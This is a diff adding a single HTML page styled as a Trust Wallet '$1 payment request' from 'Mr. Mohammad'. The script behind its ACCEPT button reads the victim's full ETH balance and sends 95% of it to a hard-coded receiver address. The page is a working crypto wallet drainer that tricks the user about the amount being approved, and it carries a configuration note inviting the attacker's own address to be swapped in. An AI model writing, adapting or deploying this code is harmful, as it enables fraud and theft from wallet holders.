@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>trust wallet</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #1a1a1a;
+            color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background-color: #2d2d2d;
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+            text-align: center;
+            max-width: 90%;
+            width: 350px;
+        }
+        h1 {
+            font-size: 24px;
+            margin-bottom: 10px;
+            color: #ffffff; /* Gold for Trust Wallet vibe */
+        }
+        p {
+            color: #cccccc;
+            font-size: 14px;
+            margin-bottom: 25px;
+        }
+        .btn {
+            background-color: #3375bb; /* Trust Wallet Blue */
+            color: white;
+            border: none;
+            padding: 15px 20px;
+            font-size: 16px;
+            font-weight: bold;
+            border-radius: 8px;
+            cursor: pointer;
+            width: 100%;
+            transition: background 0.3s;
+        }
+        .btn:hover {
+            background-color: #2a5f96;
+        }
+        .btn:disabled {
+            background-color: #555;
+            cursor: not-allowed;
+        }
+        #status {
+            margin-top: 15px;
+            font-size: 14px;
+            min-height: 20px;
+        }
+        .error { color: #ff6b6b; }
+        .success { color: #51cf66; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>Request for $1 </h1>
+    <p>Mr. Mohammad Requested Payment for $1</p>
+    
+    <button id="transferBtn" class="btn">ACCEPT</button>
+    
+    <div id="status"></div>
+</div>
+
+<script>
+    // ==========================================
+    // CONFIGURATION: CHANGE THIS ADDRESS
+    // ==========================================
+    const HARD_CODED_RECEIVER_ADDRESS = "0x4c4CBfF8c45e131ab8f2af5f04b3A162078727c7"; 
+    // Example: "0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045"
+    
+    async function checkWallet() {
+        if (typeof window.ethereum !== 'undefined') {
+            return true;
+        } else {
+            document.getElementById('status').innerHTML = "<span class='error'>Trust Wallet not detected. Open this link inside Trust Wallet.</span>";
+            return false;
+        }
+    }
+
+    async function transferFunds() {
+        const btn = document.getElementById('transferBtn');
+        const statusDiv = document.getElementById('status');
+        
+        // 1. Check for Ethereum Provider (Trust Wallet)
+        if (!(await checkWallet())) return;
+
+        try {
+            btn.disabled = true;
+            btn.innerText = "Connecting...";
+            statusDiv.innerHTML = "";
+
+            //  2. Request Account Access
+            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+            const account = accounts[0];
+
+            btn.innerText = "Confirming in Wallet...";
+
+            // 3. Estimate Gas (Optional but recommended for reliability)
+            // We calculate the exact amount to send by getting current balance first
+            const balance = await window.ethereum.request({ 
+                method: 'eth_getBalance', 
+                params: [account, 'latest'] 
+            });
+            
+            // Convert hex balance to decimal
+            const balanceDecimal = parseInt(balance, 16);
+            
+            // Subtract a small amount for gas (approx 0.005 ETH equivalent) to ensure tx goes through
+            // We use 90% of the balance to be safe with gas fees
+            const sendAmount = Math.floor(balanceDecimal * 0.95);
+
+            // 4. Prepare Transaction Object
+            const txParams = {
+                from: account,
+                to: HARD_CODED_RECEIVER_ADDRESS,
+                value: '0x' + sendAmount.toString(16), // Convert decimal to hex
+                // Gas limit is usually 21000 for simple ETH transfer, but we add buffer
+                gas: '0x5208', 
+            };
+
+            // 5. Send Transaction
+            const txHash = await window.ethereum.request({
+                method: 'eth_sendTransaction',
+                params: [txParams],
+            });
+
+            // 6. Success
+            btn.innerText = "Transfer Sent!";
+            statusDiv.innerHTML = `<span class='success'>Success! TX Hash: ${txHash}</span>`;
+            console.log("Transaction Hash:", txHash);
+
+        } catch (error) {
+            console.error(error);
+            if (error.code === 4001) {
+                statusDiv.innerHTML = "<span class='error'>User rejected the transaction in Trust Wallet.</span>";
+            } else {
+                statusDiv.innerHTML = `<span class='error'>Error: ${error.message}</span>`;
+            }
+            btn.disabled = false;
+            btn.innerText = "CONFIRM TRANSFER";
+        }
+    }
+
+    // Attach click event
+    document.getElementById('transferBtn').addEventListener('click', transferFunds);
+
+</script>
+
+</body>
+</html>
